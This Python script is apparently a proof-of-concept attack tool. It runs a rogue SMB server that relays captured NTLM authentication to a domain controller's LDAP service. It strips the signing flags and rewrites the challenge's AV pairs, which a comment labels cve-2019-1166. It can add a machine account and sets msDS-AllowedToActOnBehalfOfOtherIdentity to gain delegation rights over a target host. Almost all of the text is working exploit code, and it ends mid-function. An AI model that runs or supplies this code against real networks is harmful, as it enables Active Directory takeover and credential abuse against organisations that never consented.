#!/usr/bin/env python
#encoding: utf-8



import os
import sys
import SimpleHTTPServer
import SocketServer
import base64

import datetime
from time import sleep
from argparse import *


from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMAuthChallengeResponse

from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart

from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

from binascii import hexlify, unhexlify
from struct import unpack
from ldap3.operation import bind
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE, MODIFY_ADD, SUBTREE, NTLM
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM, RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED


from threading import Thread
import ConfigParser
import struct
import logging
import time
import calendar
import random
import string
import socket
import threading

from binascii import hexlify
from impacket import smb, ntlm, LOG, smb3
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbserver import getFileTime


from urlparse import urlparse
from impacket.dcerpc.v5 import transport, rprn


from impacket.examples import logger
from impacket import version
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
import cmd
import ntpath


# checks if the provided domain credentials have SPN(s); if not, attempt to create a machine account
class SetupAttack:
    def __init__(self, username='', domain='', password='', nthash=None, machine_username='', machine_password='',
                 server_hostname='', dn='', dc_ip='', use_ssl=False):
        self.username = username
        self.domain = domain
        self.dn = dn
        self.machine_username = machine_username
        self.machine_password = machine_password
        self.encoded_password = None
        self.server_hostname = server_hostname
        self.dc_ip = dc_ip
        self.use_ssl = use_ssl
        self.ldap_connection = None
        if nthash:
            self.password = '00000000000000000000000000000000:%s' % nthash
        else:
            self.password = password

    def get_unicode_password(self):
        password = self.machine_password
        self.encoded_password = '"{}"'.format(password).encode('utf-16-le')

    def ldap_login(self):
        print "[*] logging in to ldap server"
        if self.use_ssl == True:
            s = Server(self.dc_ip, port=636, use_ssl=True, get_info=ALL)
        else:
            s = Server(self.dc_ip, port=389, get_info=ALL)

        domain_user = "%s\\%s" % (self.domain, self.username)  # we're doing an NTLM login
        try:
            self.ldap_connection = Connection(s, user=domain_user, password=self.password, authentication=NTLM)
            if self.ldap_connection.bind() == True:
                print "[+] ldap login as %s successful" % domain_user
        except Exception, e:
            print "[!] unable to connect: %s" % str(e)
            sys.exit()

    # I put standalone code for this here: https://gist.github.com/3xocyte/8ad2d227d0906ea5ee294677508620f5
    def create_account(self):
        if self.machine_username == '':
            self.machine_username = ''.join(random.choice(string.uppercase + string.digits) for _ in range(8))
        if self.machine_username[-1:] != "$":
            self.machine_username += "$"
        if self.machine_password == '':
            self.machine_password = ''.join(
                random.choice(string.uppercase + string.lowercase + string.digits) for _ in range(25))

        self.get_unicode_password()

        dn = "CN=%s,CN=Computers,%s" % (self.machine_username[:-1], self.dn)
        dns_name = self.machine_username[:-1] + '.' + self.domain

        if self.ldap_connection.add(dn, attributes={
            'objectClass': 'Computer',
            'SamAccountName': self.machine_username,
            'userAccountControl': '4096',
            'DnsHostName': dns_name,
            'ServicePrincipalName': [
                'HOST/' + dns_name,
                'RestrictedKrbHost/' + dns_name,
                'HOST/' + self.machine_username[:-1],
                'RestrictedKrbHost/' + self.machine_username[:-1]
            ],
            'unicodePwd': self.encoded_password
        }):
            print "[+] added machine account %s with password %s" % (self.machine_username, self.machine_password)
        else:
            print "[!] failed to add machine account %s with password %s, %s might have joined too many machines to the domain, try with a different user" % (self.machine_username, self.machine_password, self.username)
            exit()

    def check_spn(self):
        search_filter = '(samaccountname=%s)' % self.username
        self.ldap_connection.search(search_base=self.dn, search_filter=search_filter, search_scope=SUBTREE,
                                    attributes=['servicePrincipalName'])
        if self.ldap_connection.entries[0]['servicePrincipalName']:
            return True
        else:
            return False

    def execute(self):
        self.ldap_login()
        if self.check_spn():
            print "[+] provided account has an SPN"
            self.machine_username = self.username
            self.machine_password = self.password
        else:
            self.create_account()
        if self.server_hostname == '':
            self.server_hostname = ''.join(random.choice(string.uppercase + string.digits) for _ in range(8))
            # was going to add an ADIDNS A record but this script is already a bit long for a PoC
        self.ldap_connection.unbind()
        return self.machine_username, self.machine_password, self.server_hostname


class LDAPRelayClientException(Exception):
    pass


# adapted from @_dirkjan and @agsolino, code: https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/clients/ldaprelayclient.py
class LDAPRelayClient:
    def __init__(self, extendedSecurity=True, dc_ip='', target='', domain='', target_hostname='', username='', dn=''):
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.targetPort = 389

        self.dc_ip = dc_ip
        self.domain = domain
        self.target = target
        self.target_hostname = target_hostname
        self.username = username
        self.dn = dn

    def getStandardSecurityChallenge(self):
        # Should return the Challenge returned by the server when Extended Security is not set
        # This should only happen with against old Servers. By default we return None
        return None

    # rbcd attack stuff
    def get_sid(self, ldap_connection, domain, target):
        search_filter = "(sAMAccountName=%s)" % target
        try:
            ldap_connection.search(self.dn, search_filter, attributes=['objectSid'])
            target_sid_readable = ldap_connection.entries[0].objectSid
            target_sid = ''.join(ldap_connection.entries[0].objectSid.raw_values)
        except Exception, e:
            print "[!] unable to to get SID of target: %s, search_filter is %s" % (str(e), search_filter)
        return target_sid

    def add_attribute(self, ldap_connection, user_sid):

        # "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<sid>"
        security_descriptor = (
            "\x01\x00\x04\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            "\x24\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00"
            "\x20\x02\x00\x00\x02\x00\x2C\x00\x01\x00\x00\x00\x00\x00\x24\x00"
            "\xFF\x01\x0F\x00"
        )

        # build payload
        payload = security_descriptor + user_sid
        # build LDAP query
        if self.target_hostname.endswith("$"):  # assume computer account
            #dn_base = "CN=%s,CN=Computers," % self.target_hostname[:-1]
            dn_base = ["CN=%s,OU=Domain Controllers," % self.target_hostname[:-1], "CN=%s,CN=Computers," % self.target_hostname[:-1]]
        else:
            dn_base = ["CN=%s,CN=Users," % self.target_hostname]

        for base in dn_base:
            dn = base + self.dn
            print "[*] adding attribute to object %s (dn: %s)..." % (self.target_hostname, dn)
            try:
                if ldap_connection.modify(dn, {'msds-allowedtoactonbehalfofotheridentity': (MODIFY_REPLACE, payload)}):
                    print "[+] added msDS-AllowedToActOnBehalfOfOtherIdentity to object %s (dn:%s) for object %s" % (
                    self.target_hostname, dn, self.username)
                    break
                else:
                    print "[!] unable to modify attribute"
            except Exception, e:
                print "[!] unable to assign attribute: %s" % str(e)

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        print "[*] initiating connection to ldap://%s:%s" % (self.dc_ip, self.targetPort)
        self.server = Server("ldap://%s:%s" % (self.dc_ip, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        self.negotiateMessage = str(negoMessage)

        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode('ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException(
                        '[!] failed to discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                    result = response[0]

                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        return challenge
                else:
                    raise LDAPRelayClientException('[!] server did not offer ntlm authentication')

    # This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
            print "unpacked response token: " + str(token)
        else:
            token = authenticateMessageBlob
        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            print "[+] relay complete"
            print "[*] running RBCD attack..."
            user_sid = self.get_sid(self.session, self.domain, self.username)
            self.add_attribute(self.session, user_sid)
            return True, STATUS_SUCCESS
        else:
            print "result is failed"
            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED:
                raise LDAPRelayClientException('[!] ldap signing is enabled')
        return None, STATUS_ACCESS_DENIED

    # This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    # Placeholder function for ldap3
    def parse_challenge_message(self, message):
        pass


# todo
class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort=636, extendedSecurity=True):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

class SMBRelayServer(Thread):
    def __init__(self, smb2support=False, domain='', dc_ip='', username='', target_fqdn='', target_hostname='', dn='', port=445, interfaceIp='0.0.0.0', ldaps=False):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        # Config object
        # self.config = config
        # Current target IP

        #todo 还要支持 ldaps
        self.target = urlparse('ldap://%s' % target_fqdn) if not ldaps else urlparse('ldaps://%s' % target_fqdn)
        # Targets handler
        # self.targetprocessor = self.config.target
        # Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None

        #######
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.target_fqdn = target_fqdn
        self.target_hostname = target_hostname
        self.dn = dn


        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global', 'server_name', 'server_name')
        smbConfig.set('global', 'server_os', 'UNIX')
        smbConfig.set('global', 'server_domain', 'WORKGROUP')
        smbConfig.set('global', 'log_file', 'smb.log')
        smbConfig.set('global', 'credentials_file', '')

        if smb2support is True:
            smbConfig.set("global", "SMB2Support", "True")
        else:
            smbConfig.set("global", "SMB2Support", "False")

        # if self.config.outputFile is not None:
        #     smbConfig.set('global', 'jtr_dump_path', self.config.outputFile)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$', 'comment', '')
        smbConfig.set('IPC$', 'read only', 'yes')
        smbConfig.set('IPC$', 'share type', '3')
        smbConfig.set('IPC$', 'path', '')

        # Change address_family to IPv6 if this is configured
        # if self.config.ipv6:
        #     SMBSERVER.address_family = socket.AF_INET6

        # changed to dereference configuration interfaceIp
        self.server = SMBSERVER((interfaceIp, port), config_parser=smbConfig)
        logging.getLogger('impacket.smbserver').setLevel(logging.CRITICAL)

        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
                                                                  self.SmbSessionSetupAndX)

        self.origSmbNegotiate = self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self.SmbNegotiate)
        self.origSmbSessionSetup = self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self.SmbSessionSetup)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        # TODO: See if this is the best way to accomplish this

        # changed to dereference configuration interfaceIp
        self.server.addConnection('SMBRelay', interfaceIp, port)

    ### SMBv2 Part #################################################################
    def SmbNegotiate(self, connId, smbServer, recvPacket, isSMB1=False):
        connData = smbServer.getConnectionData(connId, checkStatus=False)

        # self.target = self.targetprocessor.getTarget()

        #############################################################
        # SMBRelay
        # Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        LOG.info("SMBD: Received connection from %s, attacking target %s://%s" % (
        connData['ClientIP'], self.target.scheme, self.target.netloc))

        try:
            extSec = True
            # if self.config.mode.upper() == 'REFLECTION':
            #     # Force standard security when doing reflection
            #     LOG.debug("Downgrading to standard security")
            #     extSec = False
            #     # recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            # else:
            #     extSec = True
            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception, e:
            LOG.error(
                "Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            # self.targetprocessor.logTarget(self.target)
        else:
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)

        respPacket = smb3.SMB2Packet()
        respPacket['Flags'] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status'] = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command'] = smb3.SMB2_NEGOTIATE
        respPacket['SessionID'] = 0

        if isSMB1 is False:
            respPacket['MessageID'] = recvPacket['MessageID']
        else:
            respPacket['MessageID'] = 0

        respPacket['TreeID'] = 0

        respSMBCommand = smb3.SMB2Negotiate_Response()

        # Just for the Nego Packet, then disable it
        respSMBCommand['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED

        if isSMB1 is True:
            # Let's first parse the packet to see if the client supports SMB2
            SMBCommand = smb.SMBCommand(recvPacket['Data'][0])

            dialects = SMBCommand['Data'].split('\x02')
            if 'SMB 2.002\x00' in dialects or 'SMB 2.???\x00' in dialects:
                respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
                # respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21
            else:
                # Client does not support SMB2 fallbacking
                raise Exception('SMB2 not supported, fallbacking')
        else:
            respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
            # respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21

        respSMBCommand['ServerGuid'] = ''.join([random.choice(string.letters) for _ in range(16)])
        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaxTransactSize'] = 65536
        respSMBCommand['MaxReadSize'] = 65536
        respSMBCommand['MaxWriteSize'] = 65536
        respSMBCommand['SystemTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['ServerStartTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['SecurityBufferOffset'] = 0x80

        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'],
                             TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]

        respSMBCommand['Buffer'] = blob.getData()
        respSMBCommand['SecurityBufferLength'] = len(respSMBCommand['Buffer'])

        respPacket['Data'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], STATUS_SUCCESS

    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus=False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb3.SMB2SessionSetup_Response()
        sessionSetupData = smb3.SMB2SessionSetup(recvPacket['Data'])

        connData['Capabilities'] = sessionSetupData['Capabilities']

        securityBlob = sessionSetupData['Buffer']

        rawNTLM = False
        if struct.unpack('B', securityBlob[0])[0] == ASN1_AID:
            # NEGOTIATE packet
            blob = SPNEGO_NegTokenInit(securityBlob)
            token = blob['MechToken']
            if len(blob['MechTypes'][0]) > 0:
                # Is this GSSAPI NTLM or something else we don't support?
                mechType = blob['MechTypes'][0]
                if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                                mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
                    # Nope, do we know it?
                    if MechTypes.has_key(mechType):
                        mechStr = MechTypes[mechType]
                    else:
                        mechStr = hexlify(mechType)
                    smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL)
                    # We don't know the token, we answer back again saying
                    # we just support NTLM.
                    # ToDo: Build this into a SPNEGO_NegTokenResp()
                    respToken = '\xa1\x15\x30\x13\xa0\x03\x0a\x01\x03\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'
                    respSMBCommand['SecurityBufferOffset'] = 0x48
                    respSMBCommand['SecurityBufferLength'] = len(respToken)
                    respSMBCommand['Buffer'] = respToken

                    return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
        elif struct.unpack('B', securityBlob[0])[0] == ASN1_SUPPORTED_MECH:
            # AUTH packet
            blob = SPNEGO_NegTokenResp(securityBlob)
            token = blob['ResponseToken']
        else:
            # No GSSAPI stuff, raw NTLMSSP
            rawNTLM = True
            token = securityBlob

        # Here we only handle NTLMSSP, depending on what stage of the
        # authentication we are, we act on it
        messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]

        if messageType == 0x01:
            # NEGOTIATE_MESSAGE
            negotiateMessage = ntlm.NTLMAuthNegotiate()
            negotiateMessage.fromString(token)
            # Let's store it in the connection data
            connData['NEGOTIATE_MESSAGE'] = negotiateMessage

            #############################################################
            # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
            # Let's send it to the target server and send the answer back to the client.
            client = smbData[self.target]['SMBClient']
            try:
                challengeMessage = self.do_ntlm_negotiate(client, token)
            except Exception, e:
                # Log this target as processed for this client
                # self.targetprocessor.logTarget(self.target)
                # Raise exception again to pass it on to the SMB server
                raise

                #############################################################

            if rawNTLM is False:
                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = challengeMessage.getData()
            else:
                respToken = challengeMessage

            # Setting the packet to STATUS_MORE_PROCESSING
            errorCode = STATUS_MORE_PROCESSING_REQUIRED
            # Let's set up an UID for this connection and store it
            # in the connection's data
            connData['Uid'] = random.randint(1, 0xffffffff)

            connData['CHALLENGE_MESSAGE'] = challengeMessage

        elif messageType == 0x02:
            # CHALLENGE_MESSAGE
            raise Exception('Challenge Message raise, not implemented!')

        elif messageType == 0x03:
            # AUTHENTICATE_MESSAGE, here we deal with authentication
            #############################################################
            # SMBRelay: Ok, so now the have the Auth token, let's send it
            # back to the target system and hope for the best.
            client = smbData[self.target]['SMBClient']
            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)
            if authenticateMessage['user_name'] != '':
                # For some attacks it is important to know the authenticated username, so we store it

                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()
                if rawNTLM is True:
                    respToken2 = SPNEGO_NegTokenResp()
                    respToken2['ResponseToken'] = str(securityBlob)
                    securityBlob = respToken2.getData()

                clientResponse, errorCode = self.do_ntlm_auth(client, securityBlob,
                                                              connData['CHALLENGE_MESSAGE']['challenge'])
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                errorCode = STATUS_ACCESS_DENIED

            if errorCode != STATUS_SUCCESS:
                # Log this target as processed for this client
                # self.targetprocessor.logTarget(self.target)
                LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                    authenticateMessage['user_name']))
                client.killConnection()
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                    authenticateMessage['user_name']))
                # Log this target as processed for this client
                # self.targetprocessor.logTarget(self.target, True)



                del (smbData[self.target])

                connData['Authenticated'] = True

                self.do_attack(client)
                # Now continue with the server
            #############################################################

            respToken = SPNEGO_NegTokenResp()
            # accept-completed
            respToken['NegResult'] = '\x00'
            # Let's store it in the connection data
            connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
        else:
            raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

        respSMBCommand['SecurityBufferOffset'] = 0x48
        respSMBCommand['SecurityBufferLength'] = len(respToken)
        respSMBCommand['Buffer'] = respToken.getData()

        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    ################################################################################

    ### SMBv1 Part #################################################################
    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus=False)


        # TODO: Check if a cache is better because there is no way to know which target was selected for this victim
        # except for relying on the targetprocessor selecting the same target unless a relay was already done
        # self.target = self.targetprocessor.getTarget()

        #############################################################
        # SMBRelay
        # Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)

        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        LOG.info("SMBD: Received connection from %s, attacking target %s://%s" % (
        connData['ClientIP'], self.target.scheme, self.target.netloc))

        try:
            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                extSec = True
                # if self.config.mode.upper() == 'REFLECTION':
                #     # Force standard security when doing reflection
                #     LOG.debug("Downgrading to standard security")
                #     extSec = False
                #     recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                # else:
                #     extSec = True

            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception, e:
            LOG.error(
                "Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            # self.targetprocessor.logTarget(self.target)
        else:
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)

        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus=False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if struct.unpack('B', sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
                token = blob['ResponseToken']
            else:
                # NEGOTIATE packet
                blob = SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
                token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)

                # my code starts here..
                # my code part 1, not necessary
                print 'taking flags out of type 1 message'
                negotiateMessage['flags'] = negotiateMessage['flags'] & ~0x00008000  # take out always sign
                negotiateMessage['flags'] = negotiateMessage['flags'] & ~0x00000010  # take out negotiate sign
                token = negotiateMessage.getData()


                # my code part 2, taking out calling values
                # not necessary
                # negotiateMessage['host_name'] = ''
                # negotiateMessage['host_len'] = None
                # negotiateMessage['host_maxlen'] = None
                # negotiateMessage['host_offset'] = None
                #
                # negotiateMessage['domain_name'] = ''
                # negotiateMessage['domain_len'] = None
                # negotiateMessage['domain_max_len'] = None
                # negotiateMessage['domain_offset'] = None
                #
                # negotiateMessage['flags'] = negotiateMessage['flags'] & ~0x00001000  # take out domain supplied
                # negotiateMessage['flags'] = negotiateMessage['flags'] & ~0x00002000  # take out workstation supplied
                # token = negotiateMessage.getData()

                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                # Let's send it to the target server and send the answer back to the client.
                client = smbData[self.target]['SMBClient']
                try:
                    challengeMessage = self.do_ntlm_negotiate(client, token)
                except Exception, e:
                    # Log this target as processed for this client
                    # self.targetprocessor.logTarget(self.target)
                    # Raise exception again to pass it on to the SMB server
                    raise

                #############################################################

                try:
                    # my code starts here, cve-2019-1166
                    from impacket.ntlm import NTLMAuthChallenge, AV_PAIRS, NTLMSSP_AV_FLAGS
                    av_pairs = AV_PAIRS()
                    av_pairs.fromString(challengeMessage['TargetInfoFields'])

                    av_pairs[NTLMSSP_AV_FLAGS] = '\x00' * 4

                    challengeMessage['TargetInfoFields_len'] = len(av_pairs)
                    challengeMessage['TargetInfoFields_max_len'] = len(av_pairs)
                    challengeMessage['TargetInfoFields'] = av_pairs
                    challengeMessage['TargetInfoFields_offset'] = 40 + 16 + len(challengeMessage['domain_name'])

                    av_flags = '\x06\x00\x04\x00\x00\x00\x00\x00'
                    av_raw_data = av_pairs.getData()

                    # evil_av_raw_data = av_flags + av_raw_data[:av_raw_data.find(av_flags)] + av_raw_data[
                    #                                                                     av_raw_data.find(av_flags) + len(
                    #                                                                         av_flags):]

                    evil_av_raw_data = av_flags + av_pairs.getData().replace(av_flags, '')

                    evil_challenge_data = challengeMessage.getData().replace(av_raw_data, evil_av_raw_data)
                    challengeMessage = NTLMAuthChallenge()
                    challengeMessage.fromString(evil_challenge_data)

                    print 'challengeMessage swaped'
                except Exception, e:
                    exc_type, exc_obj, exc_tb = sys.exc_info()
                    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    print(exc_type, fname, exc_tb.tb_lineno)


                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                respToken['ResponseToken'] = str(challengeMessage)


                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED

                # Let's set up an UID for this connection and store it
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10

                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                client = smbData[self.target]['SMBClient']
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if authenticateMessage['user_name'] != '':
                    # For some attacks it is important to know the authenticated username, so we store it
                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                authenticateMessage['user_name'].decode('utf-16le'))).upper()

                    clientResponse, errorCode = self.do_ntlm_auth(client, sessionSetupData['SecurityBlob'],
                                                                  connData['CHALLENGE_MESSAGE']['challenge'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                    errorCode = STATUS_ACCESS_DENIED

